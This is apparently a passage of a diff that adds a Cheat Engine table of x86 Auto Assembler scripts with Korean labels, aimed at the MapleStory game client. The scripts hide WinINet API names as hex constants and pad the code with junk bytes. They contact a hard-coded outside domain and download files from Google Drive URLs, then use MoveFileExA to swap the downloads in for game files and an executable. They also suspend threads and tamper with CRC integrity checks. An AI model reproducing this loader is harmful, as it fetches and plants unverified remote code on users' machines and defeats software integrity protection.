+cmp [edi],0
+je retda
+push [allooo]
+call dword ptr [interclsoe]
+push [allooo+4]
+call dword ptr [interclsoe]
+push [allooo+8]
+call dword ptr [interclsoe]
+push #120
+call [sleepde2]
+cmp [dmomainapi-98],1
+je goto9
+cmp [dmomainapi-90],1
+je goto8
+xor esi,esi
+lea eax,[01F00FF8]
+gotoF:
+inc esi
+cmp [eax+esi],'{}}C' //1code
+jne gotoF
+cmp [eax+esi+4],'CDFG' //2code// +1
+jne gotoF
+lea edi,[eax+esi+9]
+mov [domainX],edi
+goto11:
+dec eax
+gotoFS:
+inc esi
+cmp [eax+esi+4],'{}}@' //exit
+jne gotoFS
+mov [eax+esi+4],0
+lea edi,[eax+esi+8]
+mov [domainX+4],edi
+dec eax
+Endf:
+inc esi
+cmp [eax+esi],'find' //exit
+jne Endf
+gotoFG:
+mov [eax+esi],0
+mov eax,[dointer+4]
+mov ebx,[dointer+8]
+mov ecx,[dointer+C]
+mov edx,[dointer+10]
+mov edi,[dointer+14]
+mov esi,[dointer+18]
+mov esp,[dointer+1C]
+mov ebp,[dointer+20]
+mov [dmomainapi-90],1
+push 0
+push 0
+push dmomainapi
+push dmomainapi
+push 0
+push 0
+call [crea]
+mov eax,[highter]
+mov [esp],eax
+ret
+
+
+retda:
+mov edi,[dointer-28]
+mov ebx,[dointer-2C]
+jmp retd
+
+goto8:
+xor esi,esi
+xor esi,esi
+xor edx,edx
+mov [dmomainapi-98],1
+mov ebx,[subpointers-60] //sub
+mov edi,[019E0FFA+ebx]
+goto12:
+inc esi
+cmp [edi+esi],0
+je petds
+cmp byte ptr [edi+esi],0D
+jne goto12
+cmp byte ptr [edi+esi+1],0A
+jne goto12
+mov byte ptr [edi+esi],0
+mov byte ptr [edi+esi+1],0
+lea eax,[edi+esi+2]
+mov [0143070C+edx],eax
+inc [01430608]
+add edx,4
+jmp goto12
+
+petds:
+mov eax,[dointer+4]
+mov ebx,[dointer+8]
+mov ecx,[dointer+C]
+mov edx,[dointer+10]
+mov edi,[dointer+14]
+mov esi,[dointer+18]
+mov esp,[dointer+1C]
+mov ebp,[dointer+20]
+push 0
+push 0
+push dmomainapi
+push dmomainapi
+push 0
+push 0
+call [crea]
+mov eax,[highter]
+mov [esp],eax
+ret
+
+goto9:
+mov eax,[dointer+4]
+mov ebx,[dointer+8]
+mov ecx,[dointer+C]
+mov edx,[dointer+10]
+mov edi,[dointer+14]
+mov esi,[dointer+18]
+mov esp,[dointer+1C]
+mov ebp,[dointer+20]
+push 0
+push 0
+push downcontrol
+push downcontrol
+push 0
+push 0
+call [crea]
+incs2:
+
+xor esi,esi
+incs:
+add esi,4
+add [dmomainapi+esi],#600000
+cmp [dmomainapi+esi+124],0
+jne incs
+cmp [dmomainapi+esi+128],0
+jne incs
+cmp [dmomainapi+esi+12C],0
+jne incs
+mov eax,[subpointers]
+mov eax,[eax]
+mov [eax],0
+mov [eax+4],0
+mov [eax+8],0
+mov [eax+C],0
+add [eax],0
+add [eax+4],0
+add [eax+8],0
+add [eax+C],0
+mov eax,[highter]
+mov [esp],eax
+ret
+fufu:
+push ecx
+lea ecx,[esp+04]
+sub ecx,eax
+sbb eax,eax
+not eax
+and ecx,eax
+mov eax,esp
+and eax,FFFFF000
+fufu3:
+cmp ecx,eax
+//repne jb fufu2
+db 72 0B
+mov eax,ecx
+pop ecx
+xchg eax,esp
+mov eax,[eax]
+mov [esp],eax
+repne ret
+fufu2:
+sub eax,00001000
+test [eax],eax
+jmp fufu3
+db cc cc cc cc cc cc
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>421</ID>
+          <Description>"도메인 함수 인크립션"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+label(goto1)
+01503030:
+xor esi,esi
+goto1:
+add esi,4
+add [dmomainapi+esi],#600000
+cmp [dmomainapi+esi+4],0
+jne goto1
+cmp [dmomainapi+esi+8],0
+jne goto1
+cmp [dmomainapi+esi+C],0
+jne goto1
+
+ret
+
+
+createThread(01503030)
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+          <CheatEntries>
+            <CheatEntry>
+              <ID>422</ID>
+              <Description>"도메인 비인크립션 스타트"</Description>
+              <LastState/>
+              <VariableType>Auto Assembler Script</VariableType>
+              <AssemblerScript>[ENABLE]
+//iatlist 01f213dc
+define(saveaddress,01f213dc)//[IATList]//kernel32.GetModuleHandleA
+Registersymbol(saveaddress)
+
+define(IATList,00B1008C)//[IATList]//kernel32.GetModuleHandleA
+Registersymbol(IATList)
+//[handle] //kernel32.GetModuleHandleA
+define(handle,00B10148)
+Registersymbol(handle)
+//Getpro  // kernel32.GetProcAddress
+define(Getpro,00B10064)
+Registersymbol(Getpro)
+
+//01f213dc
+
+
+
+//createThread(023FFFF0)
+define(apilist,025Ff2f0)
+Registersymbol(apilist)
+define(name,025Fe2f0)
+Registersymbol(name)
+define(domadata,025FA000)
+Registersymbol(domadata)
+define(dointer,025FA030)
+Registersymbol(dointer)
+define(allocd,025FA160)
+Registersymbol(allocd)
+define(allooo,025FAf60)
+Registersymbol(allooo)
+define(diret2,025024F0)
+Registersymbol(diret2)
+define(diret,025004D0)
+Registersymbol(diret)
+define(highter,025FAff0)
+Registersymbol(highter)
+define(dmomainapi,025Ffff0)
+Registersymbol(dmomainapi)
+
+label(subhtt2)//kernel32.GetModuleHandleA
+label(retd)
+label(fufu)
+label(fufu2)
+label(fufu3)
+label(loop1)
+label(loop2)
+label(loop3)
+label(loop4)
+label(loop5)
+label(loop6)
+label(loop7)
+label(loop8)
+diret2:
+push ebp
+mov ebp,esp
+sub esp,08
+mov [ebp-04],ecx
+mov eax,[ebp-04]
+mov [ebp-08],eax
+mov ecx,[ebp-04]
+movzx edx,byte ptr [ecx]
+test edx,edx
+je put
+call dword ptr [IATList]// kernel32.GetCurrentThreadId
+jne put
+nop
+put:
+mov esp,ebp
+pop ebp
+ret
+
+diret:
+repne jne diret+5
+repne ret
+push ebp
+mov ebp,esp
+sub esp,00
+push eax
+
+
+//rotpt.p-e.kr
+domadata:
+dd #10000
+
+dmomainapi:
+mov [dointer+4],eax
+mov eax,[esp]
+mov [highter],eax
+mov eax,[dointer+4]
+mov [name],696E6977
+mov [name+4],2E74656E
+mov [name+8],006C6C64 //1
+mov [name+40],65746E49
+mov [name+44],74656E72
+mov [name+48],6E65704F
+mov [name+4C],00000041
+mov [name+80],65746E49
+mov [name+84],74656E72
+mov [name+88],6E6E6F43
+mov [name+8C],41746365
+mov [name+c0],70747448 //InternetConnectA
+mov [name+c4],6E65704F
+mov [name+c8],75716552
+mov [name+cC],41747365
+mov [name+100],70747448 //InternetConnectA
+mov [name+104],646E6553
+mov [name+108],75716552
+mov [name+10C],41747365
+mov [name+140],65746E49 //InternetConnectA
+mov [name+144],74656E72
+mov [name+148],64616552
+mov [name+14C],656C6946 //WININET.InternetCloseHandle
+mov [name+180],'Inte' //WININET.InternetCloseHandle
+mov [name+184],'rnet'
+mov [name+188],'Clos'
+mov [name+18C],'eHan'
+mov [name+190],'dle'
+mov [name+193],0
+
+
+{
+kernel32.GetModuleHandleA
+kernel32.GetProcAddress}
+
+
+mov [allocd+500],01010101
+mov [allocd+504],01010101
+mov [allocd+508],00000001//siezse
+mov [allocd+540],74656E49//URL
+mov [allocd+544],2F4C5255
+mov [allocd+548],00302E31
+mov [allocd+588],'rltp' //URLRINGK
+mov [allocd+588+4],'t.p-'
+mov [allocd+588+8],'e.kr'
+mov [allocd+588+C],0
+mov [allocd+588+F],0
+mov [allocd+600],#47
+mov [allocd+580],#32
+mov [allocd+640],#5522759
+
+push name+40
+push name //dll
+call dword ptr [handle]//[handle] //kernel32.GetModuleHandleA
+push eax
+call dword ptr [Getpro]//[Getpro] // kernel32.GetProcAddress
+mov [apilist+4],eax
+
+push name+80
+push name //dll
+call dword ptr [handle]//[handle]
+push eax
+call dword ptr [Getpro]//[Getpro]
+mov [apilist+8],eax
+
+push name+C0
+push name //dll
+call dword ptr [handle]//[handle]
+push eax
+call dword ptr [Getpro]//[Getpro]
+mov [apilist+C],eax
+
+push name+100
+push name //dll
+call dword ptr [handle]//[handle]
+push eax
+call dword ptr [Getpro]//[Getpro]
+mov [apilist+10],eax
+
+
+push name+180
+push name //dll
+call dword ptr [handle]//[handle]
+push eax
+call dword ptr [Getpro]//[Getpro]
+mov [apilist+18],eax
+
+
+
+push name+140
+push name //dll
+call dword ptr [handle]//[handle]
+push eax
+call dword ptr [Getpro]//[Getpro]
+mov [apilist+14],eax
+
+
+
+loop1:
+jmp loop2
+db 'dfsdfssdfsdfs342234423342dfsdfsdfsdfsdffsd'
+loop2:
+push ebp
+mov ebp,esp
+push -01
+mov eax,fs:[00000000]
+push eax
+mov eax,00011810
+call fufu
+push ebx
+push esi
+push edi
+lea edi,[ebp-0001181C]
+mov ecx,00004604
+mov eax,CCCCCCCC
+repe stosd
+xor eax,ebp
+mov [ebp-10],eax
+push eax
+lea eax,[ebp-0C]
+mov fs:[00000000],eax
+mov ecx,allocd+500// 01 01 01 01 01 01 01 01 01 00 00 00
+call diret2 // { -&gt;kernel32.GetCurrentThreadId }
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push allocd+540 { ("InetURL/1.0") }
+call [apilist+4]{ -&gt;WININET.InternetOpenA }
+cmp esi,esp
+call diret //repne jne
+mov [ebp-18],eax
+mov [allooo+8],eax
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 03 { 3 }
+push allocd+580{ (32) }
+push allocd+580 { (32) }
+push 50 { 80 }
+push allocd+588 //address01f213dc
+
+subhtt2:
+mov eax,[ebp-18]
+push eax
+loop3:
+jmp loop4
+db '234234234df23sdfssdfsdfsdfsdfsdfsdfsdffsd'
+loop4:
+call [apilist+8]//[Conc] { -&gt;WININET.InternetConnectA }
+cmp esi,esp
+call diret //repne jne
+mov [ebp-24],eax
+mov [allooo+4],eax
+mov esi,esp
+push 00 { 0 }
+push 00400000
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push allocd+600 { (47) }
+push allocd+640 { (5522759) } //Get
+mov eax,[ebp-24]
+push eax
+call dword ptr [apilist+C] { -&gt;WININET.HttpOpenRequestA }
+cmp esi,esp
+call diret
+mov [ebp-30],eax
+mov [allooo],eax
+lea ecx,[ebp-000111CC]
+mov [ebp-04],00000000 { 0 }
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+mov eax,[ebp-30]
+push eax
+loop5:
+jmp loop6
+db '234234234df23sdfssdfsdfsdfsdfsdfsdfsdffsd'
+loop6:
+call dword ptr [apilist+10] { -&gt;WININET.HttpSendRequestA }////
+//////////////////////////////////
+putX:
+//call diret
+mov [ebp-000111D8],00000000{ 0 }
+mov [ebp-000111E4],00000000 { 0 }
+
+retd:
+mov esi,esp
+push domadata
+push #70000//사이즈
+push saveaddress// 저장공간
+mov edi,[dointer-28]
+mov ebx,[dointer-2C]
+mov edx,[ebp-30]
+push edx //클로즈할 핸들러
+call dword ptr [apilist+14] // { -&gt;WININET.InternetReadFile }
+cmp [saveaddress],0
+je retd
+loop7:
+jmp loop8
+db '234234234df23sdfssdfsdfsdfsdfsdfsdfsdffsd'
+loop8: //비교값
+cmp byte ptr [01f213dc],'('
+jne 0
+
+push [allooo]
+call dword ptr [apilist+18]
+push [allooo+4]
+call dword ptr [apilist+18]
+push [allooo+8]
+call dword ptr [apilist+18]
+mov [saveaddress],0
+mov eax,[highter]
+mov [esp],eax
+ret
+
+
+fufu:
+push ecx
+lea ecx,[esp+04]
+sub ecx,eax
+sbb eax,eax
+not eax
+and ecx,eax
+mov eax,esp
+and eax,FFFFF000
+fufu3:
+cmp ecx,eax
+//repne jb fufu2
+db 72 0B
+mov eax,ecx
+pop ecx
+xchg eax,esp
+mov eax,[eax]
+mov [esp],eax
+repne ret
+fufu2:
+sub eax,00001000
+test [eax],eax
+jmp fufu3
+db cc cc cc cc cc cc
+
+
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+            </CheatEntry>
+          </CheatEntries>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>473</ID>
+      <Description>"경유 도메인"</Description>
+      <ShowAsHex>1</ShowAsHex>
+      <VariableType>String</VariableType>
+      <Length>1035</Length>
+      <Unicode>0</Unicode>
+      <CodePage>0</CodePage>
+      <ZeroTerminate>1</ZeroTerminate>
+      <Address>subpointers</Address>
+      <Offsets>
+        <Offset>0</Offset>
+        <Offset>0</Offset>
+      </Offsets>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>481</ID>
+          <Description>"다운로드 도메인"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <VariableType>String</VariableType>
+          <Length>20</Length>
+          <Unicode>0</Unicode>
+          <CodePage>0</CodePage>
+          <ZeroTerminate>1</ZeroTerminate>
+          <Address>subpointers</Address>
+          <Offsets>
+            <Offset>0</Offset>
+            <Offset>4</Offset>
+          </Offsets>
+          <CheatEntries>
+            <CheatEntry>
+              <ID>480</ID>
+              <Description>"해쉬 도메인"</Description>
+              <ShowAsHex>1</ShowAsHex>
+              <VariableType>String</VariableType>
+              <Length>20</Length>
+              <Unicode>0</Unicode>
+              <CodePage>0</CodePage>
+              <ZeroTerminate>1</ZeroTerminate>
+              <Address>subpointers</Address>
+              <Offsets>
+                <Offset>0</Offset>
+                <Offset>8</Offset>
+              </Offsets>
+            </CheatEntry>
+            <CheatEntry>
+              <ID>483</ID>
+              <Description>"다운로드 도메인"</Description>
+              <ShowAsHex>1</ShowAsHex>
+              <VariableType>String</VariableType>
+              <Length>20</Length>
+              <Unicode>0</Unicode>
+              <CodePage>0</CodePage>
+              <ZeroTerminate>1</ZeroTerminate>
+              <Address>saves2</Address>
+            </CheatEntry>
+          </CheatEntries>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>147</ID>
+      <Description>"다운로더기 01413079"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+0146C700:
+db 0A 00 65 61 0A 00 00
+
+
+
+
+define(maing,01401000)
+Registersymbol(maing)
+label(main)
+define(diret,01401f00)
+Registersymbol(diret)
+define(diret2,01401F60)
+Registersymbol(diret2)
+define(allo,01402000)
+Registersymbol(allo)
+define(allof,01403000)
+Registersymbol(allof)
+label(goto1)
+label(main2)
+label(gotog)
+define(PathPrintf,01413000)
+Registersymbol(PathPrintf)
+label(ccdata)
+label(ccdata2)
+label(ccdata3)
+label(coutd)
+
+diret:
+repne jne diret+5
+repne ret
+push ebp
+mov ebp,esp
+sub esp,00
+push eax
+label(put)
+diret2:
+push ebp
+mov ebp,esp
+sub esp,08
+mov [ebp-04],ecx
+mov eax,[ebp-04]
+mov [ebp-08],eax
+mov ecx,[ebp-04]
+movzx edx,byte ptr [ecx]
+test edx,edx
+je put
+call dword ptr [Thid]// GetCurrentThreadId
+jne put
+nop
+put:
+mov esp,ebp
+pop ebp
+ret
+
+label(putd)
+label(putd2)
+label(putd3)
+label(putd4)
+label(putd5)
+maing:
+mov [handlev+104],eax
+mov [handlev+108],ebx
+mov [handlev+10c],ecx
+mov [handlev+110],edx
+mov [handlev+114],edi
+mov [handlev+118],esi
+mov [handlev+11c],esp
+mov [handlev+120],ebp
+push 0
+push 0
+push zerop
+push zerop
+push 0
+push 0
+call [crea]
+push #200
+call [sleepde2]
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push 0
+push 0
+push Mesagas
+push Mesagas
+push 0
+push 0
+call [crea]
+push #20
+call [sleepde2]
+gotog:
+push #100
+call [sleepde2]
+main:
+mov [handlev+104],eax
+mov [handlev+108],ebx
+mov [handlev+10c],ecx
+mov [handlev+110],edx
+mov [handlev+114],edi
+mov [handlev+118],esi
+mov [handlev+11c],esp
+mov [handlev+120],ebp
+mov esi,[handlev+60]
+mov eax,[00B18DCC]
+mov eax,[eax+102F70C+esi]
+cmp [eax],'http'
+je coutd
+cmp [downlack],1
+jne coutd
+push eax
+call [apilist+10]
+push allocd+8C0 // 'Data accumulator' A0 00 sapezone
+call [apilist+10]
+coutd:
+mov [downlack],1
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+
+push ebp
+mov ebp,esp
+sub esp,00000694
+push ebx
+push esi
+push edi
+lea edi,[ebp-00000694]
+mov ecx,000001A5
+mov eax,CCCCCCCC
+repe stosd
+xor eax,ebp
+mov [ebp-04],eax
+mov ecx,won //1
+call diret2
+mov [ebp-30],00000001
+mov esi,esp
+push 00
+push 00
+push 00
+push 00
+push te //tec
+call dword ptr [openi] { -&gt;WININET.InternetOpenA }
+cmp esi,esp
+call diret
+mov [ebp-0C],eax
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+mov [handlev+28],eax
+mov [handlev+2C],esi
+xor esi,esi
+mov esi,[handlev+60]
+mov eax,[00B18DCC]
+mov eax,[eax+102F70C+esi]
+cmp [eax],0
+je ccdata3
+push eax {Path ("https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-") }
+mov eax,[handlev+28]
+mov esi,[handlev+2C]
+add [handlev+60],4
+mov eax,[ebp-0C]
+mov [handlev+4],eax//handle
+push eax
+call dword ptr [openrul] { -&gt;WININET.InternetOpenUrlA }
+cmp esi,esp
+call diret
+mov [ebp-18],eax
+mov [handlev+8],eax//handle
+mov esi,esp
+push 00
+push 00000080
+push 02
+push 00
+push 00
+push 40000000 { 2.00 }
+mov [handlev+38],eax
+mov [handlev+3C],esi
+mov [handlev+154],eax
+mov [handlev+158],ebx
+mov [handlev+15c],ecx
+mov [handlev+160],edx
+mov [handlev+164],edi
+mov [handlev+168],esi
+mov [handlev+16c],esp
+mov [handlev+170],ebp
+db 6a 01
+push 001801000
+push eax
+call [01505028]//kernel32.MoveFileExA
+push #1000
+call [sleepde2]
+mov eax,[handlev+154]
+mov ebx,[handlev+158]
+mov ecx,[handlev+15c]
+mov edx,[handlev+160]
+mov edi,[handlev+164]
+mov esi,[handlev+168]
+mov esp,[handlev+16c]
+mov ebp,[handlev+170]
+xor esi,esi
+mov esi,[handlev+68]
+mov eax,[00B18DCC]
+mov eax,[eax+102F710+esi]
+cmp [eax],0
+je ccdata3
+push eax {Path ("https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-") }
+mov eax,[handlev+38]
+mov esi,[handlev+3C]
+add [handlev+68],4
+dec [DownCount]
+call dword ptr [creafd] { -&gt;kernel32.CreateFileA }
+cmp esi,esp
+call diret
+mov [ebp-00000450],eax
+mov [handlev],eax//handle
+cmp dword ptr [ebp-00000450],-01 { 255 }
+jne goto1
+xor eax,eax
+jmp putd
+putd3:
+mov [190C000],0
+jmp putd5
+putd2:
+inc [190C000]
+jmp putd5
+goto1:
+cmp dword ptr [ebp-30],01 { 0 } //jbe
+je putd2 //pixF
+cmp dword ptr [ebp-30],400 { 0 } //jbe
+je putd3 //pixF
+putd5:
+cmp dword ptr [ebp-30],00 { 0 } //jbe
+jbe putd //pixF
+cmp [190C000],#5000
+jae ccdata4//01413079
+putd4:
+mov esi,esp
+lea eax,[ebp-30]
+push eax
+push 00000400 { 1024 }
+lea ecx,[ebp-00000438]
+push ecx
+mov edx,[ebp-18]
+push edx
+call dword ptr [interread] { -&gt;WININET.InternetReadFile }
+cmp esi,esp
+call diret
+mov esi,esp
+push 00 { 0 }
+lea eax,[ebp-00000444]
+push eax
+mov ecx,[ebp-30]
+push ecx
+lea edx,[ebp-00000438]
+push edx
+mov eax,[ebp-00000450]
+push eax
+call dword ptr [writef] { -&gt;kernel32.WriteFile }
+cmp esi,esp
+call diret
+jmp goto1
+
+putd:
+push [handlev]
+call dword ptr [closeh] { -&gt;kernel32.CloseHandle }
+push [handlev+4]
+call dword ptr [interclsoe]
+push [handlev+8]
+call dword ptr [interclsoe]
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push #5 //sfff
+call [sleepde2]
+cmp [DownCount],0
+je ccdata2
+push 0
+push 0
+push main
+push main
+push 0
+push 0
+call [crea]
+push 0
+push 0
+push PathPrintf
+push PathPrintf
+push 0
+push 0
+call [crea]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+main2:
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+PathPrintf:
+cmp [allocd+1000],1
+je ccdata2
+push allocd+7C0 //Abnadon Ware download controller is launched.' 0A 00
+call [apilist+10]
+push allocd+8C0 // 'Data accumulator' A0 00
+call [apilist+10]
+push allocd+950 // 'MS api Inverse' A0 00
+call [apilist+10]
+push allocd+9C0 // 'all clear' A0 00
+call [apilist+10]
+mov [allocd+1000],1 //sub Fileter
+ccdata:
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+ccdata2:
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push 0
+push 0
+push 1901000
+push 1901000
+push 0
+push 0
+call [crea]
+push #200
+call [sleepde2]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+ccdata3:
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+mov ebp,[handlev+120]
+push 0
+push 0
+push 1901000
+push 1901000
+push 0
+push 0
+call [crea]
+push #200
+call [sleepde2]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+
+ccdata4:
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push 0
+push 0
+push 1901000
+push 1901000
+push 0
+push 0
+call [crea]
+push #200
+call [sleepde2]
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push 00C80B89 //end Clea
+call [apilist+10] //end
+push 18051F5 //end Clea
+call [apilist+10] //end
+mov eax,[handlev+104]
+mov ebx,[handlev+108]
+mov ecx,[handlev+10c]
+mov edx,[handlev+110]
+mov edi,[handlev+114]
+mov esi,[handlev+118]
+mov esp,[handlev+11c]
+mov ebp,[handlev+120]
+push 0
+push 0
+push 1901000
+push 1901000
+push 0
+push 0
+call [crea]
+push #2000
+call [sleepde2]
+mov eax,[highter]
+mov [esp],eax//kernel32.BaseThreadInitThunk+12
+ret
+
+
+1901000:
+db 6a 01
+push 1801000
+push c3bc39
+call [01505028]
+push 1
+call [sleepde2]
+db 6a 01
+push c3bc39
+push 1805000
+call [01505028]
+db 6a 01
+push 18052C0
+push 00C05D4C
+call [01505028]
+push 1
+call [sleepde2]
+db 6a 01
+push 00C05D4C
+push 1805400
+call [01505028]
+ret
+//CreateThread(maing) //MapleStory.exe+805D4C
+
+
+1805000:
+db '.\load64\mss32.img' 00 00 00 00 00 00
+1805060:
+db '.\load64\MapleStory.img' 00 00 00 00 00
+1805160:
+db 'MapleStory.img' 00 00 00 00 00
+18051C0:
+db 'MapleStory.exe' 00 00
+18051F5:
+db 'Download success' 0A 00
+18052C0:
+db '.X.exe' 00 00 00 00 00
+1805400:
+db '.\load64\MapleStory.img' 00 00 00 00 00
+
+014013F0:
+je 01413079
+[DISABLE]
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>412</ID>
+          <Description>"메세지박스"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+Mesagas:
+push 0
+push zemogd
+push meesgeA
+push 0
+call [boxa]
+ret
+[DISABLE]
+
+</AssemblerScript>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>410</ID>
+          <Description>"CMD키기"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+Define(Stdout,#32)
+01400800:
+db 'CONOUT$' 00
+0146C700:
+db 0A 00
+
+0146C600:
+db 'w' 00
+zerop:
+push ebp
+mov ebp,esp
+mov eax,00006004
+call [apilist]//0
+call [apilist+4]//4
+call [apilist+8]/8
+add eax,Stdout
+push eax
+push 0146C600//Filename
+push 01400800 //Mode
+call [apilist+C]
+push MapleStory.exe+1F05
+call [apilist+10]
+push 01400800
+call [apilist+10]
+push MapleStory.exe+1F05
+call [apilist+10]
+push 00
+push fffffffE
+call [apilist+14]
+ret
+createThread(zerop)
+[DISABLE]
+</AssemblerScript>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>492</ID>
+          <Description>"cmd컨트롤러"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+label(goto1)
+downcontrol:
+xor eax,eax
+push #2
+call [sleepde2]
+mov eax,[00B18DCC]
+test eax,eax
+je downcontrol
+mov eax,[eax+102F710]
+mov eax,[eax]
+cmp eax,0
+je downcontrol
+mov [0178FC40+4],eax
+mov [0178FC40+8],ebx
+mov [0178FC40+C],ecx
+mov [0178FC40+10],edx
+mov [0178FC40+14],edi
+mov [0178FC40+18],esi
+mov [0178FC40+1C],esp
+mov [0178FC40+20],ebp
+mov eax,[00B18DCC]
+mov eax,[eax+102F70C]
+mov eax,[eax-6]
+cmp [018D1245],eax
+je goto1
+mov [0178F310],1
+mov eax,[0178FC40+4]
+mov ebx,[0178FC40+8]
+mov ecx,[0178FC40+C]
+mov edx,[0178FC40+10]
+mov edi,[0178FC40+14]
+mov esi,[0178FC40+18]
+mov esp,[0178FC40+1C]
+mov ebp,[0178FC40+20]
+push #200
+call [sleepde2]
+mov eax,[0178FC40+4]
+mov ebx,[0178FC40+8]
+mov ecx,[0178FC40+C]
+mov edx,[0178FC40+10]
+mov edi,[0178FC40+14]
+mov esi,[0178FC40+18]
+mov esp,[0178FC40+1C]
+mov ebp,[0178FC40+20]
+push [dumpin-200]
+call [SuspendA]
+mov eax,[0178FC40+4]
+mov ebx,[0178FC40+8]
+mov ecx,[0178FC40+C]
+mov edx,[0178FC40+10]
+mov edi,[0178FC40+14]
+mov esi,[0178FC40+18]
+mov esp,[0178FC40+1C]
+mov ebp,[0178FC40+20]
+push 0
+push 0
+push 01401000
+push 01401000
+push 0
+push 0
+call [crea]
+mov eax,[0178FC40+4]
+mov ebx,[0178FC40+8]
+mov ecx,[0178FC40+C]
+mov edx,[0178FC40+10]
+mov edi,[0178FC40+14]
+mov esi,[0178FC40+18]
+mov esp,[0178FC40+1C]
+mov ebp,[0178FC40+20]
+mov eax,[highter]
+mov [esp],eax
+ret
+goto1:
+mov eax,[highter]
+mov [esp],eax
+ret
+
+createThread(01790240)
+
+
+[DISABLE]
+</AssemblerScript>
+          <CheatEntries>
+            <CheatEntry>
+              <ID>402</ID>
+              <Description>"up count"</Description>
+              <VariableType>4 Bytes</VariableType>
+              <Address>01430608</Address>
+            </CheatEntry>
+          </CheatEntries>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>411</ID>
+      <Description>"Get"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+ThreadGet:
+push allocd-80
+call [loadL]
+add eax,119E6
+mov [018D123D],eax
+xor eax,eax
+push allocd-C0
+call [loadL]
+add eax,3b0
+mov eax,[eax]
+mov [018D123D+8],eax
+ret
+createThread(ThreadGet)
+[DISABLE]
+
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>381</ID>
+          <Description>"crc주소 생성+sleep"</Description>
+          <LastState/>
+          <VariableType>Auto Assembler Script</VariableType>
+          <AssemblerScript>[ENABLE]
+//hexRay
+//83 4E 34 01 33 C0 89 46 08 89 46 0C 8B 46 34 F7 C7 00 00 00 40 74 06 83 C8 02
+//E9 77 F6 0A B1 90
+label(exit)
+label(exit2)
+
+crccontrol:
+cmp [0178F310],1
+je exit2
+mov [allocd+680],edx
+mov edx,[esp]
